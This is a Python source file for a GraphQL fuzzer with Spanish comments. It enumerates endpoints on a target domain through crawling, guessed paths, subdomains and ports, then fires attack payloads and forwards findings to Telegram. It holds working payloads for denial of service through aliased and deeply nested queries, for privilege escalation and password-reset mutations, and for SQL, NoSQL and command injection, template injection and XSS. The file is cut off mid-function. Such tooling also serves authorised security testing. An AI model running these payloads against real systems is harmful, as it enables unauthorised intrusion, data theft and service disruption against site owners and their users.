#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import argparse
import os
import sys
import time
import re
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor
import random
from colorama import Fore, Back, Style, init
import telegram
from tqdm import tqdm
import socket
from bs4 import BeautifulSoup
import http.client
import ssl
from graphql import parse, Source
import asyncio
import logging

# Configurar logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Inicializar colorama
init(autoreset=True)

# Banner ASCII
BANNER = '''
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗         ███████╗██╗   ██╗███████╗███████╗███████╗██████╗
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║         ██╔════╝██║   ██║╚══███╔╝╚══███╔╝██╔════╝██╔══██╗
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║         █████╗  ██║   ██║  ███╔╝   ███╔╝ █████╗  ██████╔╝
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║         ██╔══╝  ██║   ██║ ███╔╝   ███╔╝  ██╔══╝  ██╔══██╗
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗    ██║     ╚██████╔╝███████╗███████╗███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝    ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                                                                 By: P4IM0N
'''

# Rutas comunes de GraphQL para verificar
RUTAS_GRAPHQL = [
    "/graphql",
    "/api/graphql",
    "/query",
    "/api/query",
    "/graphiql",
    "/graphql/console",
    "/v1/graphql",
    "/v2/graphql",
    "/api",
    "/api/",
    "/api?",
    "/graphql/v1",
    "/api/v1/graphql",
    "/api/graphql/beta",
    "/graphql/public",
    "/admin/graphql",
    "/wp-json/graphql",
    "/.well-known/graphql",
    "/services/graphql",
    "/data/graphql",
    "/mobile/graphql",
    "/web/graphql",
    "/internal/graphql",
    "/api/v2/graphql",
    "/api/v1/graphql",
    "/api/v3/graphql",
    "/playground",
    "/explorer",
    "/console",
    "/gql",
    "/graph",
    "/api/graph",
    "/data",
    "/service",
    "/services/graphql",
    "/graphql/api",
    "/portal/graphql",
    "/graphql/v3",
    "/api/v3/graphql",
    "/graphql-api",
    "/graphql/v2",
    "/graphql/v4",
    "/graphql/public",
    "/graphql/private",
    "/graphql/admin",
    "/graphql/user",
    "/graphql/system",
    "/graphql/service",
    "/graphql/data",
    "/graphql/query",
    "/graphql/mutation",
    "/graphql/subscription",
    "/graphql/v1/public",
    "/graphql/v1/private",
    "/api/graphql/v1",
    "/api/graphql/v2",
    "/graphql/endpoint",
    "/graphql/interface",
    "/graphql/rest",
    "/graphql/json",
    "/graphql/xml",
    "/graphql/ws",
    "/graphql/socket",
    "/graphql/beta",
    "/graphql/staging",
    "/graphql/production",
    "/graphql/test",
    "/graphql/dev",
    "/graphql/sandbox",
    "/graphql/experimental",
    "/graphql/alpha",
    "/graphql/rc",
    "/graphql/latest",
    "/graphql/stable",
    "/graphql/legacy",
    "/graphql/old",
    "/graphql/new",
    "/graphql/current",
    "/graphql/v1.0",
    "/graphql/v2.0",
    "/graphql/v3.0",
    "/graphql/v1.1",
    "/graphql/v2.1",
    "/graphql/v3.1",
    "/graphql/v1.2",
    "/graphql/v2.2",
    "/graphql/v3.2",
    "/graphql/v1.3",
    "/graphql/v2.3",
    "/graphql/v3.3",
    "/graphql/v1.4",
    "/graphql/v2.4",
    "/graphql/v3.4",
    "/graphql/v1.5",
    "/graphql/v2.5",
    "/graphql/v3.5",
    "/graphql/v1.6",
    "/graphql/v2.6",
    "/graphql/v3.6",
    "/graphql/v1.7",
    "/graphql/v2.7",
    "/graphql/v3.7",
    "/graphql/v1.8",
    "/graphql/v2.8",
    "/graphql/v3.8",
    "/graphql/v1.9",
    "/graphql/v2.9",
    "/graphql/v3.9",
    "/graphql/v1.10",
    "/graphql/v2.10",
    "/graphql/v3.10",
    "/graphql/v1",
    "/graphql/v1/query",
    "/graphql/query",
    "/graphql/v1/api",
    "/graphql/v2/api",
    "/gql",
    "/gql/api",
    "/gql/query",
    "/api/gql",
    "/api/graph",
    "/api/v1/gql",
    "/api/v2/graphql",
    "/api/v3/graphql",
    "/v1/api/graphql",
    "/v2/api/graphql",
    "/v3/api/graphql",
    "/data/graphql",
    "/data/v1/graphql",
    "/data-api/graphql",
    "/gateway/graphql",
    "/gateway/api",
    "/connect/graphql",
    "/integration/graphql",
    "/platform/graphql",
    "/service/graphql",
    "/graphql-api",
    "/graphql-gateway",
    "/graphql/engine",
    "/graphql/auth",
    "/graphql/private",
    "/graphql/internal",
    "/graphql/cms",
    "/graphql/admin",
    "/graphql/studio",
    "/graphql/explorer",
    "/graphql/console",
    "/graphql/playground",
    "/graphql/schema",
    "/graphql/auth",
    "/graphql/oauth",
    "/graphql/authz",
    "/graphql/authn",
    "/graphql/identity",
    "/graphql/auth-server",
    "/graphql/realms",
    "/graphql/auth-provider",
    "/graphql/auth-service",
    "/api/studio",
    "/api/explorer",
    "/api/playground",
    "/api/console",
    "/graphql/v1beta",
    "/graphql/beta",
    "/graphql/uat",
    "/graphql/stage",
    "/graphql/prod",
    "/graphql/production",
    "/graphql/testing",
    "/graphql/development",
    "/graphql/sandbox",
    "/graphql/demo",
    "/graphql/legacy",
    "/graphql/current",
    "/graphql/latest",
    "/graphql/v1.0",
    "/graphql/v1.1",
    "/graphql/v1.2",
    "/graphql/v2.0",
    "/graphql/v3.0",
    "/graphql/v1/graphql",
    "/graphql/v2/graphql",
    "/graphql/v3/graphql",
    "/graphql/v1/console",
    "/graphql/v2/console"
]

# Consultas de introspección comunes
CONSULTA_INTROSPECCION = """
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
"""

MINI_INTROSPECCION = """
{
  __schema {
    types {
      name
      kind
    }
  }
}
"""

# Cargas útiles de GraphQL para probar vulnerabilidades
CARGAS_UTILES_GRAPHQL = [
    # Vulnerabilidades a nivel de consulta
    {"query": "{ __schema { types { name } } }"},
    {"query": "{ __type(name: \"User\") { name fields { name type { name kind ofType { name kind } } } } }"},

    # Consultas relacionadas con DOS
    {"query": "{ a: __schema { types { name } } b: __schema { types { name } } c: __schema { types { name } } }"},

    # Intentos de inyección NoSQL en consultas
    {"query": "{ users(where: {\"$gt\": \"\"}) { id name } }"},
    {"query": "{ users(filter: {id: {_eq: \"1\"; DROP TABLE users; --\"}}) { id } }"},

    # Intentos de bypass de autorización
    {"query": "{ users { password resetToken secretInfo } }"},
    {"query": "{ users { id adminSecret superUserFlag } }"},
    {"query": "{ currentUser { token sessionData role } }"},

    # Exposición de datos sensibles
    {"query": "{ users { email password phoneNumber creditCardNumber } }"},
    {"query": "{ systemSettings { secretKey apiToken databaseConnectionString } }"},

    # Sugerencias de campos basadas en campos sensibles comunes
    {"query": "{ users { id name email isAdmin role permissions accessToken } }"},
    {"query": "{ settings { apiKeys secrets tokens } }"},
    {"query": "{ config { database aws gcp azure } }"},

    # Pruebas de mutación
    {"query": "mutation { login(username: \"admin\", password: \"password\") { token } }"},
    {"query": "mutation { resetPassword(token: \"ANY_TOKEN\", newPassword: \"hacked\") { success } }"},
    {"query": "mutation { updateUser(id: \"1\", data: {isAdmin: true}) { id isAdmin } }"},
    {"query": "mutation { promoteUser(userId: 1, role: \"admin\") { success } }"},

    # Consultas anidadas para probar problemas de rendimiento
    {"query": "{ users { posts { comments { author { posts { comments { text } } } } } }"},

    # Consultas por lotes
    {"query": "[{\"query\": \"{ users { id } }\"}, {\"query\": \"{ __schema { types { name } } }]"},

    # Pruebas para vulnerabilidades comunes de agrupación de consultas
    {"query": "[{\"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"password\\\") { token } }\"}, {\"query\": \"{ users { id password } }\"}]"},
    
    {"query": "[{\"query\": \"{ users { email } }\"}, {\"query\": \"{ posts { privateContent }]"},
    
    {"query": "{ " + " ".join([f"alias{i}: __schema {{ types {{ name }} }}" for i in range(50)]) + " }"},
    
    {"query": "{ currentUser { secretToken } }", "headers": {"Authorization": "Bearer invalid"}},
    
    {"query": "query { " + "a".join(["{" * 10 + "id" + "}" * 10]) + " }"},
    
    {"query": "{ user { " + " ".join(["id"] * 1000) + " } }"},
    
    {"query": "query IntrospectionQuery {{\n  __schema {{\n    queryType {{ name }}\n    mutationType {{ name }}\n    types {{ name }}\n  }}\n}}"},
    
    {"query": "mutation {{ deleteOrganizationUser(input: {{id: 3}}) {{ user {{ id }} }} }}"}
]

# Clase de Configuración
class Configuracion:
    def __init__(self):
        self.dominio = ""
        self.clave_api_mistral = ""
        self.token_telegram = ""
        self.id_chat_telegram = ""
        self.hilos = 10
        self.tiempo_espera = 10
        self.verbose = False
        self.profundidad_maxima = 3

# Clase de Resultados
class Resultados:
    def __init__(self):
        self.puntos_finales_graphql = []
        self.vulnerabilidades = []
        self.esquemas = {}

# Clase principal del Fuzzer de GraphQL
class FuzzerGraphQL:
    def __init__(self, configuracion):
        self.configuracion = configuracion
        self.resultados = Resultados()
        self.sesion = requests.Session()
        self.sesion.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json"
        })
        self.url_base = self._formatear_url(configuracion.dominio)

        # Configurar el bot de Telegram si se proporciona el token
        self.bot = None
        if configuracion.token_telegram and configuracion.id_chat_telegram:
            try:
                self.bot = telegram.Bot(token=configuracion.token_telegram)
                self.id_chat_telegram = configuracion.id_chat_telegram
            except Exception as e:
                print(f"{Fore.RED}[!] Error al configurar el bot de Telegram: {e}")
                self.bot = None

    def _formatear_url(self, url):
        """Asegurarse de que la URL tenga un esquema."""
        if not urlparse(url).scheme:
            return f"https://{url}"
        return url

    def descubrir_puntos_finales(self):
        """Descubrir posibles puntos finales de GraphQL."""
        print(f"{Fore.BLUE}[*] Comenzando el descubrimiento de puntos finales de GraphQL para {self.url_base}")

        dominio_base = urlparse(self.url_base).netloc
        urls_descubiertas = set()

        # Rastrear sitio web principal
        try:
            respuesta = self.sesion.get(self.url_base, timeout=self.configuracion.tiempo_espera)
            if respuesta.status_code == 200:
                # Extraer enlaces de la página principal
                sopa = BeautifulSoup(respuesta.text, 'html.parser')
                for enlace in sopa.find_all('a', href=True):
                    href = enlace['href']
                    url_completa = urljoin(self.url_base, href)
                    if urlparse(url_completa).netloc == dominio_base:
                        urls_descubiertas.add(url_completa)

                # Buscar en archivos JS con patrones mejorados
                archivos_js = [urljoin(self.url_base, script['src']) for script in sopa.find_all('script', src=True)]
                patrones_graphql = [
                    r'["\'](/[^"\']*graphql[^"\'\?]*)["\']',
                    r'["\'](https?://[^"\']*graphql[^"\'\?]*)["\']',
                    r'endpoint["\']\s*:\s*["\']([^"\']+)',
                    r'uri["\']\s*:\s*["\']([^"\']*graphql[^"\']*)["\']',
                    r'url["\']\s*:\s*["\']([^"\']*graphql[^"\']*)["\']',
                    r'apiEndpoint["\']\s*:\s*["\']([^"\']+)',
                    r'GRAPHQL_URL["\']\s*=\s*["\']([^"\']+)',
                    r'gqlEndpoint["\']\s*:\s*["\']([^"\']+)',
                    r'["\'](/[^"\']*gql[^"\'\?]*)["\']',
                    r'["\'](https?://[^"\']*gql[^"\'\?]*)["\']',
                    r'apiPath["\']\s*:\s*["\']([^"\']+)',
                    r'serverUrl["\']\s*:\s*["\']([^"\']*graphql[^"\']*)["\']'
                ]
                
                for url_js in archivos_js:
                    if urlparse(url_js).netloc == dominio_base:
                        try:
                            respuesta_js = self.sesion.get(url_js, timeout=self.configuracion.tiempo_espera)
                            if respuesta_js.status_code == 200:
                                for patron in patrones_graphql:
                                    for coincidencia in re.finditer(patron, respuesta_js.text, re.IGNORECASE):
                                        posible_punto_final = coincidencia.group(1)
                                        if not posible_punto_final.startswith(('http://', 'https://')):
                                            posible_punto_final = urljoin(self.url_base, posible_punto_final)
                                        urls_descubiertas.add(posible_punto_final)
                        except requests.exceptions.RequestException:
                            pass
        except requests.exceptions.RequestException:
            print(f"{Fore.RED}[!] No se pudo conectar a {self.url_base}")

        # Verificar rutas comunes
        for ruta in RUTAS_GRAPHQL:
            urls_descubiertas.add(urljoin(self.url_base, ruta))

        # Escaneo mejorado de subdominios
        dominio_principal = dominio_base.split(':')[0].replace('www.', '')
        subdominios = [
            "api", "graphql", "gql", "data", "data-api", "gateway",
            "connect", "platform", "service", "auth", "identity",
            "admin", "internal", "private", "graphql-api", "graphql-gateway",
            "studio", "console", "v1", "v2", "v3", "beta", "uat", "stage",
            "prod", "production", "sandbox", "legacy", "current", "latest",
            "graphql1", "graphql2", "gql1", "gql2", "api-graphql", "api-gql",
            "graphql-service", "gql-service", "graphql-auth", "gql-auth"
        ]

        # Generar combinaciones dinámicas
        combinaciones = [
            "graphql-{}", "gql-{}", "{}-graphql", "{}-gql",
            "{}-graphql-api", "{}-gql-api", "api-{}", "{}-api"
        ]
        
        for base in ["main", "core", "prod", "dev", "test", "stage", "auth"]:
            for patron in combinaciones:
                subdominios.append(patron.format(base))

        # Construir URLs de subdominios
        for sd in subdominios:
            subdominios_completos = [
                f"{sd}.{dominio_principal}",
                f"{sd}-api.{dominio_principal}",
                f"api-{sd}.{dominio_principal}",
                f"{sd}01.{dominio_principal}",
                f"{sd}-prod.{dominio_principal}",
                f"{sd}-production.{dominio_principal}",
                f"{sd}-service.{dominio_principal}"
            ]
            
            for subd in subdominios_completos:
                # Añadir protocolos
                urls_descubiertas.add(f"https://{subd}")
                urls_descubiertas.add(f"http://{subd}")
                
                # Añadir puertos comunes
                for puerto in [3000, 4000, 5000, 6000, 7000, 8000, 8080, 8443]:
                    urls_descubiertas.add(f"https://{subd}:{puerto}")
                    urls_descubiertas.add(f"http://{subd}:{puerto}")
                
                # Verificar rutas en subdominios
                for ruta in RUTAS_GRAPHQL:
                    urls_descubiertas.add(f"https://{subd}{ruta}")
                    urls_descubiertas.add(f"http://{subd}{ruta}")

        # Probar URLs
        with ThreadPoolExecutor(max_workers=self.configuracion.hilos) as ejecutor:
            resultados = list(tqdm(
                ejecutor.map(self.probar_punto_final, urls_descubiertas),
                total=len(urls_descubiertas),
                desc="Probando posibles puntos finales"
            ))

        if not self.resultados.puntos_finales_graphql:
            print(f"{Fore.RED}[!] No se descubrieron puntos finales de GraphQL.")
        else:
            print(f"{Fore.GREEN}[+] Se descubrieron {len(self.resultados.puntos_finales_graphql)} puntos finales de GraphQL.")

        return self.resultados.puntos_finales_graphql

    def probar_punto_final(self, url):
        """Probar si un punto final es un punto final de GraphQL."""
        try:
            # Primero intentar una consulta de introspección simple
            respuesta = self.sesion.post(
                url,
                json={"query": MINI_INTROSPECCION},
                timeout=self.configuracion.tiempo_espera
            )

            if self._es_respuesta_graphql(respuesta):
                print(f"{Fore.GREEN}[+] Se encontró un punto final de GraphQL: {url}")
                self.resultados.puntos_finales_graphql.append(url)

                # Intentar obtener el esquema a través de la introspección
                respuesta_esquema = self.sesion.post(
                    url,
                    json={"query": CONSULTA_INTROSPECCION},
                    timeout=self.configuracion.tiempo_espera
                )

                if respuesta_esquema.status_code == 200 and self._es_respuesta_graphql(respuesta_esquema):
                    try:
                        datos_esquema = respuesta_esquema.json()
                        if '__schema' in datos_esquema.get('data', {}):
                            print(f"{Fore.GREEN}[+] Se recuperó correctamente el esquema de GraphQL para {url}")
                            self.resultados.esquemas[url] = datos_esquema

                            # Enviar notificación
                            self._enviar_notificacion(f"🔍 Se encontró un punto final de GraphQL: {url} con acceso completo al esquema!")

                            # Obtener análisis de IA si está habilitado
                            if self.configuracion.clave_api_mistral:
                                analisis = self._obtener_analisis_ia(f"Se encontró un punto final de GraphQL en {url} con introspección completa habilitada. Esto es un problema de seguridad porque expone la estructura de la API. Datos del esquema: {json.dumps(datos_esquema)[:500]}...")
                                print(f"{Fore.BLUE}[IA] Análisis completo:\n{analisis}\n{'-'*80}")
                    except json.JSONDecodeError:
                        pass
                return True

            # Si POST falla, intentar GET con consulta modificada para bypass
            MINI_INTROSPECCION_GET = """
            api?query {
            __schema {
                types {
                name
                }
            }
            }
            """.strip().replace('\n', '%0A').replace(' ', '%20')
            params = {'query': MINI_INTROSPECCION_GET}
            respuesta_get = self.sesion.get(url, params=params, timeout=self.configuracion.tiempo_espera)
            if self._es_respuesta_graphql(respuesta_get):
                print(f"{Fore.GREEN}[+] Se encontró un punto final de GraphQL (método GET): {url}")
                self.resultados.puntos_finales_graphql.append(url)
                # Decodificar la respuesta JSON
                datos_esquema = respuesta_get.json()
                if '__schema' in datos_esquema.get('data', {}):
                    self.resultados.esquemas[url] = datos_esquema
                    self._enviar_notificacion(f"🔍 Se encontró un punto final de GraphQL (método GET): {url} con acceso completo al esquema!")
                return True
            else:
                return False

        except requests.exceptions.RequestException:
            pass

        return False

    def _es_respuesta_graphql(self, respuesta):
        """Verificar si una respuesta parece provenir de un punto final de GraphQL."""
        if respuesta.status_code not in [200, 400, 500]:
            return False

        tipo_contenido = respuesta.headers.get('Content-Type', '')
        if 'application/json' not in tipo_contenido and 'json' not in tipo_contenido:
            return False

        try:
            datos = respuesta.json()

            # Verificar la estructura típica de una respuesta de GraphQL
            if any(clave in datos for clave in ['data', 'errors', '__schema', 'types']):
                return True

            # Verificar patrones de error de GraphQL
            if 'errors' in datos and isinstance(datos['errors'], list):
                for error in datos['errors']:
                    if isinstance(error, dict) and 'message' in error:
                        if any(termino in error['message'].lower() for termino in ['syntax', 'graphql', 'query', 'mutation', 'parse', 'validate']):
                            return True
        except (json.JSONDecodeError, AttributeError):
            pass

        return False

    def fuzzear_puntos_finales(self):
        """Probar los puntos finales de GraphQL descubiertos en busca de vulnerabilidades."""
        if not self.resultados.puntos_finales_graphql:
            print(f"{Fore.YELLOW}[!] No hay puntos finales de GraphQL para fuzzear.")
            return

        print(f"{Fore.BLUE}[*] Comenzando a fuzzear {len(self.resultados.puntos_finales_graphql)} puntos finales de GraphQL")

        for punto_final in self.resultados.puntos_finales_graphql:
            print(f"{Fore.BLUE}[*] Fuzzeado punto final: {punto_final}")
            
            if punto_final not in self.resultados.esquemas:
                continue  # Saltar si no hay esquema
            
            esquema = self.resultados.esquemas[punto_final]

            # Primero analizar el esquema si está disponible
            if punto_final in self.resultados.esquemas:
                
                self._analizar_esquema(punto_final, self.resultados.esquemas[punto_final])   
                
                # 2. Probar inyección en argumentos (necesita el esquema)
                self._probar_inyeccion_argumentos(punto_final, self.resultados.esquemas[punto_final]) 

            # Luego probar con cargas útiles preparadas
            for carga_util in CARGAS_UTILES_GRAPHQL:
                try:
                    respuesta = self.sesion.post(
                        punto_final,
                        json=carga_util,
                        timeout=self.configuracion.tiempo_espera
                    )

                    # Analizar la respuesta en busca de posibles vulnerabilidades
                    self._analizar_respuesta(punto_final, carga_util, respuesta)

                except requests.exceptions.RequestException as e:
                    if self.configuracion.verbose:
                        print(f"{Fore.YELLOW}[!] Error al probar {punto_final} con carga útil {carga_util}: {e}")
                        continue

            # Generar cargas útiles dinámicas basadas en el esquema si está disponible
            if punto_final in self.resultados.esquemas:
                cargas_utiles_dinamicas = self._generar_cargas_utiles_dinamicas(self.resultados.esquemas[punto_final])
                for carga_util in cargas_utiles_dinamicas:
                    try:
                        respuesta = self.sesion.post(
                            punto_final,
                            json={"query": carga_util},
                            timeout=self.configuracion.tiempo_espera
                        )

                        # Analizar la respuesta en busca de posibles vulnerabilidades
                        self._analizar_respuesta(punto_final, {"query": carga_util}, respuesta)

                    except requests.exceptions.RequestException as e:
                        if self.configuracion.verbose:
                            print(f"{Fore.YELLOW}[!] Error al probar {punto_final} con carga útil dinámica: {e}")
                            continue

    def _analizar_esquema(self, punto_final, datos_esquema):
        """Analizar el esquema de GraphQL en busca de posibles vulnerabilidades."""
        try:
            # Buscar tipos y campos sensibles
            tipos_sensibles = ['User', 'Admin', 'Password', 'Token', 'Secret', 'Auth', 'Permission', 'postPassword', 'postUser']
            campos_sensibles = ['password', 'token', 'secret', 'key', 'admin', 'credit', 'ssn', 'social', 'private']

            tipos = datos_esquema.get('data', {}).get('__schema', {}).get('types', [])

            for info_tipo in tipos:
                nombre_tipo = info_tipo.get('name', '')

                # Omitir tipos de introspección
                if nombre_tipo.startswith('__'):
                    continue

                # Verificar nombres de tipos sensibles
                for sensible in tipos_sensibles:
                    if sensible.lower() in nombre_tipo.lower():
                        vulnerabilidad = {
                            'punto_final': punto_final,
                            'tipo': 'Exposición de Tipo Sensible',
                            'detalle': f"Se encontró un tipo potencialmente sensible: {nombre_tipo}",
                            'severidad': 'Media'
                        }
                        print(f"{Fore.RED}[!] {vulnerabilidad['detalle']} en {punto_final}")
                        self.resultados.vulnerabilidades.append(vulnerabilidad)
                        self._enviar_notificacion(f"🚨 Problema de seguridad: {vulnerabilidad['detalle']} en {punto_final}")

                        # Obtener análisis de IA
                        if self.configuracion.clave_api_mistral:
                            analisis = self._obtener_analisis_ia(f"El esquema de GraphQL expone un tipo sensible: {nombre_tipo} en {punto_final}. ¿Cuáles podrían ser las implicaciones de seguridad o vectores de ataque? enumeralas del uno al 3 comenzando con este emoji cada un 🔍 y luego utiliza un breve ejemplos si es necesario. ")
                            print(f"{Fore.BLUE}[IA] Análisis completo:\n{analisis}\n{'-'*80}")

                # Verificar campos de tipos de objeto
                if info_tipo.get('kind') == 'OBJECT' and 'fields' in info_tipo:
                    for campo in info_tipo.get('fields', []):
                        nombre_campo = campo.get('name', '')

                        # Verificar nombres de campos sensibles
                        for sensible in campos_sensibles:
                            if sensible.lower() in nombre_campo.lower():
                                vulnerabilidad = {
                                    'punto_final': punto_final,
                                    'tipo': 'Exposición de Campo Sensible',
                                    'detalle': f"Se encontró un campo potencialmente sensible: {nombre_tipo}.{nombre_campo}",
                                    'severidad': 'Media'
                                }
                                print(f"{Fore.RED}[!] {vulnerabilidad['detalle']} en {punto_final}")
                                self.resultados.vulnerabilidades.append(vulnerabilidad)
                                self._enviar_notificacion(f"🚨 Problema de seguridad: {vulnerabilidad['detalle']} en {punto_final}")

                                # Obtener análisis de IA
                                if self.configuracion.clave_api_mistral:
                                    analisis = self._obtener_analisis_ia(f"El esquema de GraphQL expone un campo sensible: {nombre_tipo}.{nombre_campo} en {punto_final}. ¿Cuáles podrían ser las implicaciones de seguridad o vectores de ataque? enumeralas del uno al 3 comenzando con este emoji cada un 🔍 y luego utiliza un breve ejemplos si es necesario. ")
                                    print(f"{Fore.BLUE}[IA] Análisis completo:\n{analisis}\n{'-'*80}")

            # Verificar mutaciones que podrían ser peligrosas
            tipo_mutacion = datos_esquema.get('data', {}).get('__schema', {}).get('mutationType', {})
            if tipo_mutacion and 'name' in tipo_mutacion:
                nombre_tipo_mutacion = tipo_mutacion['name']
                # Encontrar el objeto de tipo de mutación
                for info_tipo in tipos:
                    if info_tipo.get('name') == nombre_tipo_mutacion and 'fields' in info_tipo:
                        mutaciones_peligrosas = ['create', 'update', 'delete', 'remove', 'reset', 'change']
                        for campo in info_tipo.get('fields', []):
                            nombre_campo = campo.get('name', '')
                            for peligrosa in mutaciones_peligrosas:
                                if peligrosa.lower() in nombre_campo.lower():
                                    vulnerabilidad = {
                                        'punto_final': punto_final,
                                        'tipo': 'Mutación Potencialmente Peligrosa',
                                        'detalle': f"La mutación podría permitir la modificación de datos: {nombre_campo}",
                                        'severidad': 'Baja'
                                    }
                                    print(f"{Fore.YELLOW}[!] {vulnerabilidad['detalle']} en {punto_final}")
                                    self.resultados.vulnerabilidades.append(vulnerabilidad)

        except Exception as e:
            if self.configuracion.verbose:
                print(f"{Fore.RED}[!] Error al analizar el esquema: {e}")

    def _generar_cargas_utiles_dinamicas(self, datos_esquema):
        """Generar cargas útiles personalizadas basadas en el esquema."""
        cargas_utiles = []
        try:
            tipos = datos_esquema.get('data', {}).get('__schema', {}).get('types', [])

            # Encontrar tipo de consulta
            nombre_tipo_consulta = datos_esquema.get('data', {}).get('__schema', {}).get('queryType', {}).get('name')
            if not nombre_tipo_consulta:
                return cargas_utiles

            # Obtener campos del tipo de consulta
            campos_consulta = []
            for info_tipo in tipos:
                if info_tipo.get('name') == nombre_tipo_consulta and 'fields' in info_tipo:
                    campos_consulta = info_tipo.get('fields', [])
                    break

            # Generar cargas útiles para cada campo de consulta
            for campo in campos_consulta:
                nombre_campo = campo.get('name', '')

                # Omitir campos de introspección
                if nombre_campo.startswith('__'):
                    continue

                # Extraer tipo de retorno del campo (puede venir anidado)
                tipo_retorno = campo.get('type', {})
                while 'ofType' in tipo_retorno:
                    tipo_retorno = tipo_retorno['ofType']
                nombre_tipo_retorno = tipo_retorno.get('name')

                # Obtener campos internos del tipo de retorno
                campos_a_pedir = "id name title"
                for tipo in tipos:
                    if tipo.get('name') == nombre_tipo_retorno and tipo.get('fields'):
                        nombres_campos = [f.get('name') for f in tipo['fields']]
                        campos_a_pedir = ' '.join(nombres_campos)
                        break

                # Generar una consulta simple para este campo
                carga_util = f"{{ {nombre_campo} }}"
                cargas_utiles.append(carga_util)

                # Consulta solicitando todos los campos del tipo
                carga_util = f"{{ {nombre_campo} {{ {campos_a_pedir} }} }}"
                cargas_utiles.append(carga_util)

                # Si el campo tiene argumentos, generar queries específicas
                argumentos = campo.get('args', [])
                if argumentos:
                    for argumento in argumentos:
                        nombre_argumento = argumento.get('name', '')
                        tipo_argumento = argumento.get('type', {})

                        if nombre_argumento in ['id', 'ID', 'userId', 'user_id']:
                            # Probar con distintos valores de ID
                            for val in ["1", "0", "-1", "1' OR '1'='1"]:
                                carga_util = f"{{ {nombre_campo}({nombre_argumento}: \"{val}\") {{ {campos_a_pedir} }} }}"
                                cargas_utiles.append(carga_util)

                            # Opcional: Probar con un rango de IDs
                            for val in range(2, 10):  # e.g., 2 a 5
                                carga_util = f"{{ {nombre_campo}({nombre_argumento}: \"{val}\") {{ {campos_a_pedir} }} }}"
                                cargas_utiles.append(carga_util)

        except Exception as e:
            if self.configuracion.verbose:
                print(f"{Fore.RED}[!] Error al generar cargas útiles dinámicas: {e}")

        return cargas_utiles


    #EXTRA pruebas de inyecciones varias SQLi, Cmd, SSTI) en argumentos de tipo String.
    # Asegúrate de tener: import asyncio al inicio del archivo si usas Telegram

    def _probar_inyeccion_argumentos(self, punto_final, esquema):
        """
        Intenta inyectar payloads comunes (SQLi, Cmd, SSTI) en argumentos de tipo String.
        Versión Robusta con chequeos adicionales.
        """
        # --- Verificación inicial del esquema ---
        if not isinstance(esquema, dict): # Asegurar que el esquema es un diccionario
            print(f"{Fore.YELLOW}[!] Se recibió un esquema inválido (no es dict) para {punto_final}")
            return

        print(f"{Fore.CYAN}[*] Iniciando pruebas de inyección en argumentos String en {punto_final}")

        # --- Acceso seguro a la estructura del esquema ---
        data = esquema.get('data')
        if not isinstance(data, dict):
            print(f"{Fore.YELLOW}[!] Estructura 'data' inválida o no encontrada en el esquema para {punto_final}")
            return
        schema_info = data.get('__schema')
        if not isinstance(schema_info, dict):
            print(f"{Fore.YELLOW}[!] Estructura '__schema' inválida o no encontrada en el esquema para {punto_final}")
            return

        tipos = schema_info.get('types') # Obtenemos la lista (o None)
        query_type_info = schema_info.get('queryType')
        mutation_type_info = schema_info.get('mutationType')

        # Obtener nombres de forma segura
        tipo_consulta_nombre = query_type_info.get('name') if isinstance(query_type_info, dict) else None
        tipo_mutacion_nombre = mutation_type_info.get('name') if isinstance(mutation_type_info, dict) else None

        # Verificar que 'tipos' sea una lista antes de iterar
        if not isinstance(tipos, list):
            print(f"{Fore.YELLOW}[!] 'types' en el esquema no es una lista para {punto_final}")
            return
        # --- Fin Acceso seguro ---


        payloads_inyeccion = {
            "SQLi": ["'", "\"", "`", " OR 1=1 --", "SLEEP(10)"],
            "NoSQLi": ["[$ne]", "[$gt]", "{'$ne': 1}", "' && this.password.match(/.*/)//"],
            "Cmd": ["; id", "| id", "`id`", "$(id)"],
            "SSTI": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
            "XSS": ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"]
        }

        campos_a_probar = []
        # --- Recolección Robusta de Argumentos ---
        for tipo in tipos:
            # Asegurar que cada elemento en 'tipos' es un diccionario
            if not isinstance(tipo, dict):
                if self.configuracion.verbose: print(f"{Fore.YELLOW}[!] Elemento no-dict encontrado en 'types'")
                continue # Saltar este elemento

            tipo_nombre = tipo.get('name')
            # Verificar si es Query o Mutation Type (y que los nombres no sean None)
            if tipo_nombre and (tipo_nombre == tipo_consulta_nombre or tipo_nombre == tipo_mutacion_nombre):
                campos = tipo.get('fields')
                # Verificar que 'fields' sea una lista
                if not isinstance(campos, list):
                    # Es normal no tener args, no imprimir warning a menos que verbose
